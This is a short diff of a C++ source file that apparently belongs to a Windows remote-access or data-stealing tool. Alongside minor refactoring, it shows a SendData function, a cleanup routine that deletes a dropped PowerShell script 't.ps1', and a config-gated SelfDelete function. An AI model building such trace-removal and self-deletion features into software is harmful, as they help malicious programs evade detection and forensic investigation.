@@ -2,7 +2,7 @@
 #include "misc.h"
 
 #include "utils.h"
-
+#include "globals.h"
 
 bool misc::SendData(std::string data) noexcept
 {
@@ -33,8 +33,12 @@ bool misc::SendData(std::string data) noexcept
 	return retVal;
 }
 
-void misc::Cleanup() noexcept
+void misc::Cleanup(void) noexcept
 {
+	// We close these regardless of the cleanup option...
+	if (globals::g_hStdOutR != NULL) CloseHandle(globals::g_hStdOutR);
+	if (globals::g_hStdOutW != NULL) CloseHandle(globals::g_hStdOutW);
+
 	if (!config::cleanup)
 		return;
 	if(utils::isFile("goop.txt"))
@@ -44,7 +48,7 @@ void misc::Cleanup() noexcept
 		std::remove("t.ps1");
 }
 
-void misc::SelfDelete() noexcept
+void misc::SelfDelete(void) noexcept
 {
 	if (!config::selfdelete)
 		return;
